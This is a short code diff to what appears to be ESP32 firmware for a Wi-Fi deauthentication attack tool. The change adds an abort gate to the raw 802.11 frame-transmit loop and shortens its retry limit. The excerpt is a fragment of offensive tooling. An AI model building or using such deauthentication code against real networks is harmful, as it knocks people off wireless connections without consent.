@@ -24,6 +24,12 @@ static const uint8_t BROADCAST[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
 static volatile wifi_interface_t s_tx_if = WIFI_IF_AP;
 void deauth_set_tx_if(wifi_interface_t ifx) { s_tx_if = ifx; }
 
+// Optional abort gate: when set (control.c does this while rewriting attack
+// state), blast() stops within one frame instead of finishing its burst.
+static const volatile bool *s_tx_gate = NULL;
+void deauth_set_gate(const volatile bool *gate) { s_tx_gate = gate; }
+static inline bool tx_halted(void) { return s_tx_gate && *s_tx_gate; }
+
 // TX counters (for the live packets/sec readout).
 static volatile uint32_t s_tx_ok = 0, s_tx_fail = 0;
 void deauth_get_stats(uint32_t *ok, uint32_t *fail)
@@ -66,8 +72,9 @@ static int blast(uint8_t subtype, const uint8_t dest[6], const uint8_t src[6],
     // returns ESP_ERR_NO_MEM. Wait and retry so every requested frame actually
     // goes out, instead of dropping it.
     int sent = 0, guard = 0;
-    while (sent < count && guard < count * 40) {
+    while (sent < count && guard < count * 8) {
         guard++;
+        if (tx_halted()) break;                            // attack state rewrite
         esp_err_t e = esp_wifi_80211_tx(s_tx_if, s_frame, sizeof(s_frame), true);
         if (e == ESP_OK) { s_tx_ok++; sent++; }
         else if (e == ESP_ERR_NO_MEM) { vTaskDelay(1); }   // buffer full, drain
